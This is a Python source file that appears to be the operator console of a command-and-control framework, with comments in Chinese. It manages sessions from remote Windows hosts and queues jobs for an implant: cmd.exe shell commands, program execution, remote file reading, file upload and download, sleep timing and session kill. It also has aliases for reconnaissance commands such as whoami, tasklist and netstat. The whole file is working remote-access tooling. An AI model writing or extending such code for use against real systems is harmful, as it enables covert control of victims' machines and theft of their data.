#!/usr/bin/env python3
# coding:utf-8
from prompt_toolkit import PromptSession
import shlex
from .color import BOLD


class Shell():
    def __init__(self, session):
        self.session = session
        self.PROMPT_MSG = '>'
        self.CMD_SESSION = None
        self.input = PromptSession()

        self.alias = {'ls': 'dir ',
                      'ps': 'tasklist ',
                      'kill': 'taskkill /F /PID ',
                      'ipconfig': 'ipconfig ',
                      'ifconfig': 'ipconfig ',
                      'netstat': 'netstat ',
                      'whoami': 'whoami /user',
                      'net': 'net ',
                      }

    def __show_alias(self):
        print('{:>20}: {}'.format(BOLD('ALIAS_NAME'), BOLD('SHELL_CMD')))
        for alias_name, cmd in self.alias.items():
            print('{:>20}: {}'.format(BOLD(alias_name), cmd))

    def __print_session_help(self):
        print('Usage:')
        print('{}{}: list all sessions'.format(' '*8, BOLD('sessions | s')))
        print('{}{} [sessionID]: interactive cmd with sessionID'.format(
            ' '*8, BOLD('sessions | s -i')))
        print('{}{} [sessionID]: show one session detail'.format(
            ' '*8, BOLD('sessions | s -v')))
        print('{}{} [sessionID]: remove one session'.format(
            ' '*8, BOLD('sessions | s -r')))
        print('{}{}: exit'.format(' '*8, BOLD('exit/quit')))

    def __print_cmd_help(self):
        print('Usage:')
        print('{}{}: get system info'.format(' '*8, BOLD('info')))
        print('{}{} [seconds]: set sleep time'.format(
            ' '*8, BOLD('sleep')))
        print('{}{} [cmd]: execute shell command'.format(
            ' '*8, BOLD('shell')))
        print('{}{} [cmd]: run program and return'.format(
            ' '*8, BOLD('run')))
        print('{}{} [path_file]: show remote file context'.format(
            ' '*8, BOLD('cat')))
        print('{}{} [local_file] [remote_file]: upload file'.format(
            ' '*8, BOLD('upload')))
        print('{}{} [local_file] [remote_file]: download file'.format(
            ' '*8, BOLD('download')))
        print('{}{}: show shell alias name'.format(' '*8, BOLD('alias')))
        print('{}{}: exit current session'.format(' '*8, BOLD('back')))

    '''
    交互式执行命令
    '''

    def parse_cmd(self, commands, action, args, text):
        if not self.CMD_SESSION:
            return True

        if action == 'help':
            self.__print_cmd_help()
        elif action == 'back' or action == 'exit' or action == 'quit':
            self.CMD_SESSION = None
            self.PROMPT_MSG = '>'
        elif action == 'alias':
            self.__show_alias()
        elif action == 'info':
            self.CMD_SESSION['job'].add_job(action)
        elif action == 'sleep' and len(commands) == 2:
            try:
                self.CMD_SESSION['job'].add_job(
                    'sleep', sleep=str(int(commands[1])))
            except Exception as ex:
                print('[-]{}'.format(ex))
        elif action == 'shell':
            self.CMD_SESSION['job'].add_job(
                'shell', cmd='cmd.exe /c {}'.format(args))
        elif action == 'run':
            self.CMD_SESSION['job'].add_job(action, cmd=args)
        elif action == 'cat':
            self.CMD_SESSION['job'].add_job(action, file_pathname=args)
        elif action == 'upload' or action == 'download':
            args_upload = shlex.split(text)
            if len(args_upload) != 3:
                print('usage:{} local_pathname remote_pathname'.format(action))
            else:
                self.CMD_SESSION['job'].add_job(
                    action, local_pathname=args_upload[1], remote_pathname=args_upload[2])
        elif action in self.alias:
            self.CMD_SESSION['job'].add_job(
                'shell', cmd='cmd.exe /c {} {}'.format(self.alias.get(action), args))

        return True
    
    '''
    session管理
    '''

    def parse_session(self, commands, action, args):
        if action == 'sessions' or action == 's':
            if len(commands) == 3:
                if commands[1] == '-i':
                    # 与指定SID进行交互式命令
                    s = self.session.get_session(int(commands[2]))
                    if s:
                        self.CMD_SESSION = s
                        self.PROMPT_MSG = '{}(SID:{}) >'.format(
                            s['client_ip'], s['id'])
                elif commands[1] == '-v':
                    # 显示一个SID的详细情况
                    self.session.show_session_detail(int(commands[2]))
                elif commands[1] == '-k':
                    # KILLSID
                    confirm = self.input.prompt(
                        'Confirm Kill Session:YES(y)/No(enter)?')
                    if confirm == 'y':
                        s = self.session.get_session(int(commands[2]))
                        if s:
                            s['job'].add_job('kill')
                elif commands[1] == '-r':
                    # 移除SID
                    confirm = self.input.prompt(
                        'Confirm Remove Session:YES(y)/No(enter)?')
                    if confirm == 'y':
                        self.session.remove_session(int(commands[2]))
            else:
                # 显示所有sessions
                self.session.list_sessions()
        elif action == 'help':
            self.__print_session_help()
        elif action == 'exit' or action == 'quit':
            confirm = self.input.prompt('Confirm Exit:YES(y)/No(enter)?')
            return False if confirm == 'y' else True

        return True

    '''
    获取输入的命令并进行解析
    '''

    def get_command(self):
        try:
            text = self.input.prompt(self.PROMPT_MSG)
        except KeyboardInterrupt:
            confirm = self.input.prompt('Confirm Exit:YES(y)/No(enter)?')
            return False if confirm == 'y' else True
        # 为了确保路径能在windows里能正确执行，对\进行转义
        text = text.strip().replace('\\', '\\\\').replace('"', '\\"')
        # 按空格进行分隔参数
        commands = text.split(' ')
        if len(commands) == 0:
            return True

        # 命令与参数
        action = commands[0].strip()
        args = ' '.join([commands[x] for x in range(1, len(commands))])

        if not self.CMD_SESSION:
            # 解析session管理
            return self.parse_session(commands, action, args)
        else:
            # 解析交互式命令
            self.parse_cmd(commands, action, args, text)

        return True
